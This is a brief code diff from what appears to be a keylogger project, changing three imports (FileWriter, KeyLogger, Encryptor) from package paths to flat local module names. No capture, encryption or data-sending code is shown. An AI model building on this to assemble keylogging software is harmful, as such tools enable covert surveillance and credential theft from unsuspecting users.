@@ -1,7 +1,7 @@
 import time
-from ikeylogger.agent.file_writer import FileWriter
-from ikeylogger.agent.keylogger_service import KeyLogger
-from ikeylogger.agent.encryptor import Encryptor
+from file_writer import FileWriter
+from keylogger_service import KeyLogger
+from encryptor import Encryptor
 
 
 
